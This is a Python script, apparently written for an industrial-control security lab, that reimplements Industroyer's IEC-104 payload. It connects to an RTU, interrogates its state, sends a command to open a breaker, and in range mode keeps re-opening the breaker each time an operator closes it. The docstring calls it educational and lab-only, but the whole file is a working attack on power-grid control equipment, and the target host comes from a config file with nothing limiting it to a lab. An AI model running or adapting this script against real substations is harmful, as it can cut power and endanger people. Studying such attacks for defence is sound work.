#!/usr/bin/env python3
"""industroyer104 - a staged, explainable IEC-104 attack payload (LAB-ONLY).

An educational stand-in for Industroyer/CrashOverride's IEC-104 (IEC 60870-5-104)
payload module. It is NOT malware: it is an ordinary c104 client that speaks the
*real* protocol to the lab RTU and narrates every step it takes, so an audience
can see exactly what "a legitimate control command used as a weapon" looks like
on the wire.

Faithful to the real module:
  - requires a manually staged config (104.cfg) naming the target + addressing,
  - connects to :2404, runs a general interrogation (C_IC_NA_1) to read state,
  - issues a single command (C_SC_NA_1) to trip the breaker, and
  - in RANGE mode, enumerates the configured IOA range and *sustains* open
    commands across it (the real module's Range/Shift/Sequence behaviour) =
    denial of control: the operator cannot out-click it from the HMI.

Usage:  industroyer104.py [104.cfg] [mode]   (mode overrides the config's; default
        config: /opt/ics/104.cfg; mode: single | range)
"""
import configparser
import os
import sys
import time

import c104

CFG_DEFAULT = "/opt/ics/104.cfg"


def log(line: str = "") -> None:
    print(line, flush=True)


def asdu(arrow: str, type_id: str, ca: int, ioa, cot: str, extra: str = "") -> None:
    """Print one ASDU the way a protocol analyzer would summarise it."""
    ioa_s = "       -" if ioa is None else f"{ioa:>8}"
    log(f"   {arrow} {type_id:<10} CA={ca:<3} IOA={ioa_s}  COT={cot:<16} {extra}")


def load_cfg(path: str) -> dict:
    cp = configparser.ConfigParser()
    if not cp.read(path):
        log(f"[!] cannot read staged config {path}")
        sys.exit(1)
    t = cp["target"]
    return {
        "host": t.get("host", "10.0.3.50"),
        "port": t.getint("port", 2404),
        "ca": t.getint("common_address", 47),
        "status_ioa": t.getint("status_ioa", 11),
        "command_ioa": t.getint("command_ioa", 12),
        "current_ioa": t.getint("current_ioa", 13),
        "voltage_ioa": t.getint("voltage_ioa", 14),
        "mode": t.get("mode", "range").strip().lower(),
        "range_start": t.getint("ioa_range_start", t.getint("command_ioa", 12)),
        "range_end": t.getint("ioa_range_end", t.getint("command_ioa", 12)),
    }


def roster() -> None:
    """Industroyer was a framework with per-protocol payload modules. We ship one
    (104) live and stub the rest, honestly, to show the framework shape."""
    log("=" * 64)
    log("  INDUSTROYER payload launcher  (IEC-104 module · LAB SIMULATION)")
    log("=" * 64)
    log("  module roster:")
    log("    101 (IEC 60870-5-101, serial) : no serial targets  · skip")
    log("    61850 (MMS)                   : not configured      · skip")
    log("    OPC DA                        : not configured      · skip")
    log("    104 (IEC 60870-5-104, TCP)    : 1 target            · ENGAGE")
    log("")


def connect(cfg: dict):
    client = c104.Client()
    conn = client.add_connection(ip=cfg["host"], port=cfg["port"])
    station = conn.add_station(common_address=cfg["ca"])
    pts = {
        "status": station.add_point(io_address=cfg["status_ioa"], type=c104.Type.M_SP_NA_1),
        "current": station.add_point(io_address=cfg["current_ioa"], type=c104.Type.M_ME_NC_1),
        "voltage": station.add_point(io_address=cfg["voltage_ioa"], type=c104.Type.M_ME_NC_1),
        "command": station.add_point(io_address=cfg["command_ioa"], type=c104.Type.C_SC_NA_1),
    }
    client.start()
    log(f"[*] staged config: target {cfg['host']}:{cfg['port']}  CA={cfg['ca']}  "
        f"cmd IOA={cfg['command_ioa']}  mode={cfg['mode']}")
    log(f"[*] connecting to {cfg['host']}:{cfg['port']} ...")
    for _ in range(30):
        if conn.is_connected:
            break
        time.sleep(0.5)
    if not conn.is_connected:
        log("[!] no connection to the RTU (is 2404 reachable from here?)")
        sys.exit(1)
    time.sleep(2)  # let the IEC-104 session finish starting before commanding
    log("[+] connected — the RTU accepts the session (no authentication: this is the thesis)")
    # Return the client too: it must stay referenced for the session to live on.
    return client, conn, pts


def interrogate(conn, cfg: dict, pts: dict) -> None:
    log("")
    log("[*] general interrogation (read the station's current state)")
    asdu("->", "C_IC_NA_1", cfg["ca"], None, "6 (activation)", "[interrogate all]")
    conn.interrogation(common_address=cfg["ca"])
    time.sleep(1.0)
    state = "CLOSED" if pts["status"].value else "OPEN"
    asdu("<-", "M_SP_NA_1", cfg["ca"], cfg["status_ioa"], "20 (interrogated)",
         f"breaker = {state}")
    asdu("<-", "M_ME_NC_1", cfg["ca"], cfg["current_ioa"], "20 (interrogated)",
         f"line current = {pts['current'].value:.0f} A")
    asdu("<-", "M_ME_NC_1", cfg["ca"], cfg["voltage_ioa"], "20 (interrogated)",
         f"bus voltage  = {pts['voltage'].value:.1f} kV")


def trip(conn, cfg: dict, pts: dict) -> bool:
    """Send one C_SC_NA_1 OFF and confirm the breaker opened. Returns True if open."""
    cmd = pts["command"]
    cmd.value = False  # OFF = OPEN the breaker
    asdu("->", "C_SC_NA_1", cfg["ca"], cfg["command_ioa"], "6 (activation)",
         "single command = OFF  [OPEN breaker]")
    cmd.transmit(cause=c104.Cot.ACTIVATION)
    opened = False
    for _ in range(8):  # poll the state until the open is reflected back
        time.sleep(0.8)
        conn.interrogation(common_address=cfg["ca"])
        time.sleep(0.4)
        if pts["status"].value is False:
            opened = True
            break
    asdu("<-", "C_SC_NA_1", cfg["ca"], cfg["command_ioa"],
         "7 (act-confirm)", "ACK" if opened else "sent")
    return opened


def main() -> int:
    cfg = load_cfg(sys.argv[1] if len(sys.argv) > 1 else CFG_DEFAULT)
    if len(sys.argv) > 2 and sys.argv[2].strip():
        cfg["mode"] = sys.argv[2].strip().lower()  # CLI override (single | range)
    roster()
    client, conn, pts = connect(cfg)  # keep `client` referenced for the whole run
    interrogate(conn, cfg, pts)

    log("")
    log("[*] STAGE 2 — issuing the breaker-open command")
    opened = trip(conn, cfg, pts)
    log(f"[{'+' if opened else '!'}] breaker is now "
        f"{'OPEN — feeder de-energized' if opened else 'not confirmed open'}")

    if cfg["mode"] != "range":
        log("[*] single-shot mode: done.")
        return 0

    lo, hi = cfg["range_start"], cfg["range_end"]
    log("")
    log(f"[*] RANGE mode — enumerating command IOAs {lo}..{hi} and sustaining OPEN")
    for ioa in range(lo, hi + 1):
        if ioa == cfg["command_ioa"]:
            asdu("->", "C_SC_NA_1", cfg["ca"], ioa, "6 (activation)", "OFF  [configured point]")
        else:
            asdu("->", "C_SC_NA_1", cfg["ca"], ioa, "6 (activation)", "OFF  [no such point · ignored]")
    log("")
    log(">>> SUSTAINING range-mode open commands. The operator cannot hold the")
    log(">>> breaker closed while this runs.  Press Ctrl-C to stop (eviction).")
    log("")
    try:
        while True:
            conn.interrogation(common_address=cfg["ca"])
            time.sleep(0.6)
            if pts["status"].value:  # operator managed to CLOSE it — slam it back
                pts["command"].value = False
                pts["command"].transmit(cause=c104.Cot.ACTIVATION)
                asdu("->", "C_SC_NA_1", cfg["ca"], cfg["command_ioa"],
                     "6 (activation)", "OFF  [re-trip: operator tried to close]")
            time.sleep(1.0)
    except KeyboardInterrupt:
        log("")
        log("[*] payload stopped (host evicted / isolated). Sustained commanding ends.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
